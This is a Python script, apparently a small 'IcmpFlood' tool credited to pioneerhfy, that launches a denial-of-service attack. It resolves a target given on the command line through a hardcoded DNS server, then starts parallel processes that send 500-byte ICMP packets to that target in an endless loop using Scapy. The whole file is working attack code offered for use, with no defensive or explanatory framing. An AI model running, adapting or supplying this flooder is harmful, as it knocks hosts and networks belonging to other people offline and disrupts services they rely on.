import time
import sys
import multiprocessing
from scapy.all import *


def preset(cpu_number): 
	processes = [multiprocessing.Process(target=start_attack, args=()) for i in range(cpu_number)]

	for i in range(cpu_number):
		processes[i].start()
	for i in range(cpu_number):
		processes[i].join()

def start_attack():
	ip_adress = ""
	data = "X"*500 
	if len(sys.argv) < 2:
		print("Please give an ip adress or domain name")
	else:
		try:
			
			packet = sr1(IP(dst="195.175.39.49")/UDP()/DNS(rd=1, qd=DNSQR(qname=sys.argv[1])), verbose=False, timeout=2)
			ip_adress = packet[1][DNSRR].rdata
		except:
			ip_adress = sys.argv[1]
		
		
		send(IP(dst=ip_adress)/ICMP()/data, verbose=False, loop=1) 

def main():
	t = round(time.time())


	preset(multiprocessing.cpu_count()-1) 

	print("Attack finished with: %s seconds" % (round(time.time() - t)))
	sys.exit()


if __name__ == '__main__':

	banner = """ \033[1m \033[33m
###                        #######                               
 #  ####  #    # #####  # #       #       ####   ####   #####  
 # #    # ##  ## #    # # #       #      #    # #    # #    # 
 # #      # ## # #    # # #####   #      #    # #    # #    # 
 # #      #    # #####  # #       #      #    # #    # #    # 
 # #    # #    # #      # #       #      #    # #    # #    # 
###  ####  #    # #      # #       ######  ####   ####   #####  

Author: pioneerhfy
Built With: Python 2.7 and Scapy (Updated to Py3 for Compatibility) \033[0m
	 """
	print(banner)
	try:
		t = round(time.time())
		main()
	except:
		
		try:
			print("Attack finished with: %s seconds" % (round(time.time() - t)))
		except:
			pass
		sys.exit()
		
    #ZEYNEP KARATEPE
